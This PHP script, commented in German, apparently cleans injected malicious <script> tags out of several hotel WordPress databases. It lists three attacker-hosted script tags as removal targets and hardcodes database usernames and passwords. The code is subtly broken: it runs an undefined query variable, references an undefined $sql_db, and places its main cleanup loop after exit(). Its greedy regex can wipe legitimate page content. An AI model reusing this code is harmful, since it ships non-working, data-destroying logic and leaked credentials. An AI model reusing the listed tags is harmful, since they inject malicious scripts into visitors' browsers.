<?php

/**********************************************************
 * Hotel - Filmservice
 **********************************************************/
$sql_host = 'localhost';
$sql_user = 'user88';
$sql_pass = 'Sdsmegpw21;';

// Verbindung zur Datenbank
$cfg = mysqli_connect ( $sql_host, $sql_user, $sql_pass ) or die ( 'Could not open connection to server' );

mysqli_select_db ( $cfg, 'wordpress88' ) or die ( 'Could not select database ' . $sql_db );
$sql1 = "UPDATE `wp_posts` SET `post_content` = REGEXP_REPLACE( `post_content`,\"<script(.*)</script>\",\"\") WHERE `post_content` IS NOT NULL";
$sql2 = "UPDATE `wp_fsi_posts` SET `post_content` = REGEXP_REPLACE( `post_content`,\"<script(.*)</script>\",\"\") WHERE `post_content` IS NOT NULL";
mysqli_query ( $cfg, $sql1 ) or die ( mysqli_error ( $cfg ) );
mysqli_query ( $cfg, $sql2 ) or die ( mysqli_error ( $cfg ) );

mysqli_select_db ( $cfg, 'wordpress88_3' ) or die ( 'Could not select database ' . $sql_db );
$sql1 = "UPDATE `wpwft_posts` SET `post_content` = REGEXP_REPLACE( `post_content`,\"<script(.*)</script>\",\"\") WHERE `post_content` IS NOT NULL";
mysqli_query ( $cfg, $sql3 ) or die ( mysqli_error ( $cfg ) );

/**
 * ********************************************************
 * Hotel - Zentral
 * ********************************************************
 */
$sql_host = 'localhost';
$sql_user = 'wordpress113';
$sql_pass = 'hotel21;';

$cfg = mysqli_connect ( $sql_host, $sql_user, $sql_pass ) or die ( 'Could not open connection to server' );
// wordpress_113
mysqli_select_db ( $cfg, 'wordpress113' ) or die ( 'Could not select database ' . $sql_db );
$sql1 = "UPDATE `wp_posts` SET `post_content` = REGEXP_REPLACE( `post_content`,\"<script(.*)</script>\",\"\") WHERE `post_content` IS NOT NULL";
mysqli_query ( $cfg, $sql3 ) or die ( mysqli_error ( $cfg ) );



exit ();


$hack_array[1] = "<script src='https://forwardmytraffic.com/ad.js?port=5' type='text/javascript'></script>";
$hack_array[2] = "<script src='https://blueeyeswebsite.com/ad.js' type='text/javascript'></script>";
$hack_array[3] = "<script src='https://hotopponents.site/site.js?zzz=3' type='text/javascript'></script>";

// UPDATE `wp_posts` SET `post_content` = replace(`post_content`, "<script ></script>","") WHERE `post_content` LIKE CONVERT( _utf8 "%<script src='https://forwardmytraffic.com/ad.js?port=5' type='text/javascript'></script>%" USING latin1 )
// UPDATE `wp_posts` SET `post_content` = replace(`post_content`, "<script src='https://hotopponents.site/site.js?zzz=3' type='text/javascript'></script>","") WHERE `post_content` LIKE CONVERT( _utf8 "%<script src='https://hotopponents.site/site.js?zzz=3' type='text/javascript'></script>%" USING latin1 )
// UPDATE `wp_posts` SET `post_content` = replace(`post_content`, "<script src='https://blueeyeswebsite.com/ad.js' type='text/javascript'></script>","") WHERE `post_content` LIKE CONVERT( _utf8 "%<script src='https://blueeyeswebsite.com/ad.js' type='text/javascript'></script>%" USING latin1 )

foreach ( $hack_array as $key => $hack_url ) {
	
	// wordpress_88
	mysqli_select_db ( $cfg, 'wordpress88' ) or die ( 'Could not select database ' . $sql_db );
	$sql1 = "UPDATE `wp_posts` SET `post_content` = replace(`post_content`, \"$hack_url\",\"\") WHERE `post_content` LIKE CONVERT( _utf8 \"%$hack_url%\" USING latin1 );";
	$sql2 = "UPDATE `wp_fsi_posts` SET `post_content` = replace(`post_content`, \"$hack_url\",\"\") WHERE `post_content` LIKE CONVERT( _utf8 \"%$hack_url%\" USING latin1 );";
	mysqli_query ( $cfg, $sql1 ) or die ( mysqli_error ( $cfg ) );
	mysqli_query ( $cfg, $sql2 ) or die ( mysqli_error ( $cfg ) );
	
	// wordpress_88_3
	mysqli_select_db ( $cfg, 'wordpress88_3' ) or die ( 'Could not select database ' . $sql_db );
	$sql3 = "UPDATE `wpwft_posts` SET `post_content` = replace(`post_content`, \"$hack_url\",\"\") WHERE `post_content` LIKE CONVERT( _utf8 \"%$hack_url%\" USING latin1 );";
	mysqli_query ( $cfg, $sql3 ) or die ( mysqli_error ( $cfg ) );
}

$sql_host = 'localhost';
$sql_user = 'wordpress113';
$sql_pass = 'hotel21;';

$cfg = mysqli_connect ( $sql_host, $sql_user, $sql_pass ) or die ( 'Could not open connection to server' );
foreach ( $hack_array as $key => $hack_url ) {
	// wordpress_113
	mysqli_select_db ( $cfg, 'wordpress113' ) or die ( 'Could not select database ' . $sql_db );
	$sql3 = "UPDATE `wpwft_posts` SET `post_content` = replace(`post_content`, \"$hack_url\",\"\") WHERE `post_content` LIKE CONVERT( _utf8 \"%$hack_url%\" USING latin1 );";
	mysqli_query ( $cfg, $sql3 ) or die ( mysqli_error ( $cfg ) );
}

echo "fertig!";